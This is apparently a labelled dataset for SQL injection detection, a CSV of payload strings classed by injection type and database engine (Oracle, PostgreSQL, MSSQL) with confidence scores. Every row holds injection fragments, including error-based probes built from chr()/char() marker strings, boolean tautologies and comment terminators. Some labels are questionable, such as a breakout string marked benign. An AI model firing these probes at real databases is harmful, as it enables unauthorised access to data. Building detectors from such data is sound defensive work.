id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
39842,"select * from users WHERE username = ""1"" or username = ""-4322\' ) ) as magw where 1627 = 1627 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""-5062 ) where 7457 = 7457 and username = ""-8007\' ) ) as bgpp where 9555 = 9555",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39843,-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39844,"select * from users WHERE username = ""-5863"" and ( ( 5139 = 5139"" and username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
39845,"select * from users WHERE username = ""-1549\' ) and ( \'fnwx\' = \'fnwx"" and username = ""1"" or username = ""-1641\' ) ) or username = ""-2733\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39846,1 ) ) and ( ( 5139 = 5139,unknown,generic,0.50,Insufficient data to classify payload type,1
39847,"1 or username = ""-1254"" or username = ""1 ) and ( 3530 = 3530",unknown,generic,0.50,Insufficient data to classify payload type,1
39848,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1"" and username = ""1\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39849,"select * from users WHERE username = ""1%"" or username = ""1\' ) ) and username = ""-8860 )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39850,"select * from users WHERE username = ""-2992\' ) ) and 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39851,"select * from users WHERE username = ""1%"" and username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39852,"select * from users where username = ""1 ) ) as xoch where 8765 = 8765",benign,generic,0.50,Legitimate SQL query without attack signals,1
39853,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and ( ( 8254 = 8254"" and username = ""-9688%\' ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39854,"-3613%\' ) or ( \'%\' = \'"" or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39855,-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39856,"select * from users WHERE username = ""1"" and ""xyjg"" = ""xyjg"" or username = ""-7242\' and \'kfff\' = \'kfff"" or username = ""1",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39857,"select * from users WHERE username = ""1\' ) ) and ( ( \'yhku\' like \'yhku"" or username = ""1\' ) as pogx where 4105 = 4105",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39858,"-9688%\' ) ) or username = ""1%\' ) ) and ( ( \'%\' = \'"" and username = ""-4582 ) ) as gvfo where 8885 = 8885 and ( ( ( 6723 = 6723",unknown,generic,0.50,Insufficient data to classify payload type,1
39859,"select * from users WHERE username = ""1"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-1254"" and username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39860,"select * from users WHERE username = ""-1985 ) ) ) and \'nmdq\' like \'nmdq"" or username = ""1%\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39861,"1\' ) and username = ""-1254"" or username = ""1 ) and ( 3530 = 3530",unknown,generic,0.50,Insufficient data to classify payload type,1
39862,"1\' ) ) and username = ""-1190\' and \'yxry\' like \'yxry",unknown,generic,0.50,Insufficient data to classify payload type,1
39863,"select * from users WHERE username = ""-6353%\' ) ) and ( ( \'%\' = \'"" and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-7874 ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39864,"select * from users WHERE username = ""1 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1 ) ) and username = ""1 ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39865,"-5863"" and ( ( ( \'itxy\' like \'itxy",unknown,generic,0.50,Insufficient data to classify payload type,1
39866,"select * from users WHERE username = ""-7072\' ) and username = ""-1254"" or username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
39867,"-6353%\' ) ) and username = ""1\' ) ) and ( ( \'qtul\' like \'qtul",unknown,generic,0.50,Insufficient data to classify payload type,1
39868,"1 where 5161 = 5161 and username = ""-9770\' ) ) as ovhh where 7903 = 7903 or username = ""-7242\' and \'kfff\' = \'kfff",unknown,generic,0.50,Insufficient data to classify payload type,1
39869,"select * from users WHERE username = ""-8353\' ) ) ) and ( ( ( \'ptlz\' = \'ptlz"" or username = ""1 )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39870,"select * from users WHERE username = ""1 ) ) ) and ( ( ( 4694 = 4694"" or username = ""-1254"" or username = ""1 ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39871,"select * from users WHERE username = ""-6720\' ) ) ) or username = ""-1254"" or username = ""-7209\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39872,"-7072\' ) or username = ""1\' and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39873,"1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) or username = ""1"" or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39874,"-9770\' ) ) as ovhh where 7903 = 7903 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1"" and \'kfff\' = \'kfff",unknown,generic,0.50,Insufficient data to classify payload type,1
39875,1%\' ) ) ) and ( ( ( \'%\' = \',unknown,generic,0.50,Insufficient data to classify payload type,1
39876,"select * from users WHERE username = ""1"" and username = ""-1254"" and username = ""-9564 and username = ""-6190\' ) where 2621 = 2621",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39877,-2733\' ) ) ) and ( ( ( \'btjx\' = \'btjx,unknown,generic,0.50,Insufficient data to classify payload type,1
39878,1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39879,1\' and \'foju\' = \'foju,unknown,generic,0.50,Insufficient data to classify payload type,1
39880,"select * from users WHERE username = ""-5863"" and username = ""1 ) ) and username = ""1 where 5161 = 5161",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39881,"1 ) ) ) or username = ""-3185\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'rknd\' like \'rknd",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39882,"select * from users WHERE username = ""-8069\' ) ) and ( ( \'qbvz\' = \'qbvz"" and username = ""-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39883,"select * from users WHERE username = ""1"" or username = ""-4322\' ) ) as magw where 1627 = 1627 and username = ""1 )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39884,"SELECT * FROM users WHERE username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" AND username = ""-9501\' )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39885,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and username = ""-1549\' )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39886,"select * from users WHERE username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39887,1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39888,"1\' ) ) ) or username = ""-1254"" or username = ""-8069\' ) ) and ( ( ( 1248 = 1248",unknown,generic,0.50,Insufficient data to classify payload type,1
39889,"1\' ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39890,"select * from users WHERE username = ""1 ) as nbno where 9816 = 9816 and username = ""-1254"" or username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39891,-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg,unknown,generic,0.50,Insufficient data to classify payload type,1
39892,"select * from users WHERE username = ""-9770\' ) ) as ovhh where 7903 = 7903 or username = ""-6353%\' ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39893,"1 or username = ""-5062 ) where 7457 = 7457 and username = ""1%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39894,"select * from users WHERE username = ""1\' and ( ( ( \'%\' = \'"" or username = ""1\'+ ( select oljg where 2006 = 2006",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39895,"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39896,"1\' ) or username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39897,"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 or username = ""-1254"" and username = ""1 ) where 3381 = 3381",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39898,"select * from users WHERE username = ""1"" and username = ""-1254"" and username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""-9742 ) where 8409 = 8409",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39899,"select * from users WHERE username = ""1"" and username = ""1\' and username = ""-7199\' or username = ""-7962\' ) ) as pgqz where 6058 = 6058",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39900,"-6190\' ) where 2621 = 2621 or username = ""-1254"" or username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg",unknown,generic,0.50,Insufficient data to classify payload type,1
39901,"1\'+ ( select vohg where 6383 = 6383 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1"" and username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39902,"-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1"" and username = ""-1190\' and \'yxry\' like \'yxry",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39903,"select * from users WHERE username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1%\' )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39904,"1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39905,"1%"" and ( ( \'ajka\' = \'ajka"" and username = ""1\' ) ) ) and ( 2576 = 2576",unknown,generic,0.50,Insufficient data to classify payload type,1
39906,"-4262%\' ) ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""1\' ) ) and ( ( \'ajka\' = \'ajka",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39907,"1\' or username = ""1%\' and \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39908,"-1854\' ) as fmmq where 7326 = 7326 and username = ""-5863"" and ( \'fnwx\' = \'fnwx",unknown,generic,0.50,Insufficient data to classify payload type,1
39909,"select * from users WHERE username = ""-5863"" and ""gkvy"" = ""gkvy"" and username = ""1"" and username = ""1"" or username = ""-2348 ) as sige where 1639 = 1639",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39910,"select * from users WHERE username = ""-1254"" or username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696 and username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
39911,-3185\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'rknd\' like \'rknd,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39912,"-1344 ) as gqgi where 2545 = 2545 and username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk",unknown,generic,0.50,Insufficient data to classify payload type,1
39913,-8057\' ) ) as gpue where 4205 = 4205 || 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39914,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1"" and username = ""-2951",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39915,"-4322\' ) ) as magw where 1627 = 1627 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""1",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39916,"1\'|| ( sElEct \'tisi\' from dual whErE 1616 = 1616 AND username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39917,"-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-7242\' and \'kfff\' = \'kfff",unknown,generic,0.50,Insufficient data to classify payload type,1
39918,"select * from users WHERE username = ""1"" or username = ""1\' ) ) ) or username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2783%\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39919,"select * from users WHERE username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""-9564 or username = ""-9263\' ) as qodg where 6798 = 6798",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39920,"SELECT * FROM users WHERE username = ""1"" and username = ""1\' ) where 1502 = 1502 OR usErnamE = ""1\' ) ) as plbt whErE 4368 = 4368",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39921,"select * from users WHERE username = ""-5863"" and username = ""1 ) ) and ( ( 5139 = 5139"" or username = ""-8112\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39922,"select * from users WHERE username = ""-3424\' ) ) and ( ( \'dyuo\' = \'dyuo"" or username = ""1"" and username = ""1\'+ ( select oljg where 2006 = 2006",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39923,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'ykjs\' like \'ykjs"" and username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39924,"-8163 ) ) as cvai where 2360 = 2360 and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'iuki\' = \'iuki",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39925,1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39926,"-4610\' ) ) or username = ""-5863"" and username = ""1%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39927,"1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-1190\' and ( ( ( 1248 = 1248",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39928,"-2756\' where 6156 = 6156 and username = ""1"" and username = ""1\' ) ) ) or username = ""-2374 ) and ( 2576 = 2576",unknown,generic,0.50,Insufficient data to classify payload type,1
39929,"1"" or username = ""-2806\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'rxzr\' = \'rxzr",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39930,-5313\' ) ) ) and ( ( ( \'wkkp\' like \'wkkp,unknown,generic,0.50,Insufficient data to classify payload type,1
39931,-6665\' ) ) ) and ( ( ( \'winx\' = \'winx,unknown,generic,0.50,Insufficient data to classify payload type,1
39932,"1\' ) ) and ( ( \'qtul\' like \'qtul"" and username = ""-5863",unknown,generic,0.50,Insufficient data to classify payload type,1
39933,"1\' ) and username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" and username = ""-8057\' ) ) as gpue where 4205 = 4205 || 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39934,"1\' ) ) as plbt where 4368 = 4368 and username = ""-7430\' ) as xfah where 1596 = 1596 and username = ""1"" and username = ""1%",unknown,generic,0.50,Insufficient data to classify payload type,1
39935,"1\' ) OR username = ""-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39936,"1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39937,1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39938,"select * from users WHERE username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and username = ""1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39939,"-6036 ) ) ) or username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39940,"-5062 ) where 7457 = 7457 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39941,"select * from users WHERE username = ""1"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976 or username = ""-8163 ) ) as cvai where 2360 = 2360",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
